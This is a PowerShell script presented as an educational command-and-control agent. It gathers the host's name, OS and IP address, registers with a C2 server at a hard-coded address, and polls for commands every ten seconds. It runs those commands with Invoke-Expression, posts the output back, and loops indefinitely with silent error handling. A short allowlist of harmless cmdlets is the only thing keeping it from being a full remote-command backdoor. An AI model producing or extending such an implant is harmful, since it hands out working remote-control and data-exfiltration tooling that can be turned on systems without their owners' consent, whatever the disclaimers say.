# Educational Example: C2 Agent Communication Concept
# This is a simplified demonstration script for educational purposes only
# DO NOT use this in production or against unauthorized systems

# Configuration placeholder (would be replaced with actual values)
$C2_SERVER = "http://10.0.0.207:8084"  # Placeholder URL
$AGENT_ID = "EDU-AGENT-001"             # Placeholder agent identifier

# Agent information gathering
$hostname = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "169.254.*" -and $_.IPAddress -notlike "127.*"} | Select-Object -First 1).IPAddress

# System information collection
$systemInfo = @{
    hostname = $hostname
    os = $os
    ip = $ip
    timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    agent_version = "1.0.0"
}

# Function to register agent with C2 server
function Register-Agent {
    try {
        $body = $systemInfo | ConvertTo-Json
        $response = Invoke-RestMethod -Uri "$C2_SERVER/register" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 10
        return $true
    }
    catch {
        return $false
    }
}

# Function to get commands from C2 server
function Get-Command {
    try {
        $command = Invoke-RestMethod -Uri "$C2_SERVER/command/$hostname" -Method GET -TimeoutSec 10
        return $command
    }
    catch {
        return ""
    }
}

# Function to send command results back to C2 server
function Send-Result {
    param($output)
    try {
        $resultBody = @{ output = $output } | ConvertTo-Json
        Invoke-RestMethod -Uri "$C2_SERVER/result/$hostname" -Method POST -Body $resultBody -ContentType "application/json" -TimeoutSec 10
        return $true
    }
    catch {
        return $false
    }
}

# Function to execute commands safely
function Execute-Command {
    param($command)
    
    if ([string]::IsNullOrEmpty($command)) {
        return "No command received"
    }
    
    try {
        # Basic command validation (educational example)
        $safeCommands = @(
            "Get-Process",
            "Get-Service",
            "Get-NetIPAddress",
            "Get-ComputerInfo",
            "Get-Date",
            "Get-Host",
            "Get-Location"
        )
        
        if ($safeCommands -contains $command) {
            $output = Invoke-Expression $command | Out-String
            return $output
        }
        else {
            return "Command not allowed in educational mode: $command"
        }
    }
    catch {
        return "Error executing command: $($_.Exception.Message)"
    }
}

# Main agent loop - keeps connection alive
$lastRegistration = Get-Date
$registrationInterval = 300  # Re-register every 5 minutes
$commandInterval = 10        # Check for commands every 10 seconds

# Initial registration
Register-Agent

# Main persistent loop
while ($true) {
    try {
        $currentTime = Get-Date
        
        # Re-register periodically to keep connection alive
        if (($currentTime - $lastRegistration).TotalSeconds -ge $registrationInterval) {
            Register-Agent
            $lastRegistration = $currentTime
        }
        
        # Check for commands from C2 server
        $command = Get-Command
        if ($command -ne "") {
            # Execute the command and send results back
            $output = Execute-Command -command $command
            Send-Result -output $output
        }
        
        # Keep connection alive
        Start-Sleep -Seconds $commandInterval
    }
    catch {
        # Silent error handling - continue running
        Start-Sleep -Seconds $commandInterval
    }
}
